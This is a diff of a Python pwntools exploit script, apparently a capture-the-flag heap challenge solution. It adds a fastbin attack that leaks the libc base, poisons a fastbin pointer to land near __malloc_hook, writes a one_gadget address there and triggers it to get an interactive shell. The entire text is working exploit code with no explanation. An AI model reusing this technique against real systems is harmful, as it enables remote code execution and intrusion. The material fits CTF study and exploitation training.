@@ -38,7 +38,7 @@ def main():
     	r.sendline(str(idx))
 
     # Leak libc address
-    
+
     alloc(0x20) # 0 fastbin - edit fd of fastbin
     alloc(0x20) # 1 fastbin
     alloc(0x20) # 2 fastbin
@@ -63,7 +63,29 @@ def main():
     leak = u64(r.recvn(8))
     libc.address = leak - 0x3c4b78
 
-    print hex(libc.address)
+    log.info("libc base address: {}".format(hex(libc.address)))
+    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 
+    
+    # fastbin attack __malloc_hook
+
+    return_2hook = libc.symbols['__malloc_hook'] - 0x23
+    one_gadget = libc.address + 0x4526a 
+    
+    alloc(0x60) # 4 fastbin- edit fd of fasting
+    alloc(0x60) # 6 fastbin
+    alloc(0x60) # 7 fastbin
+
+    free(7)
+    free(6)
+
+    fill(4, 0x78, "A" * 0x68 + p64(0x71) + p64(return_2hook))
+
+    alloc(0x60) # idx 6
+    alloc(0x60) # idx 7
+
+    fill(7, 0x1b, "A" * 0x13 + p64(one_gadget))
+
+    alloc(0xdeadbeef)
     #gdb.attach(r)
     r.interactive()
 
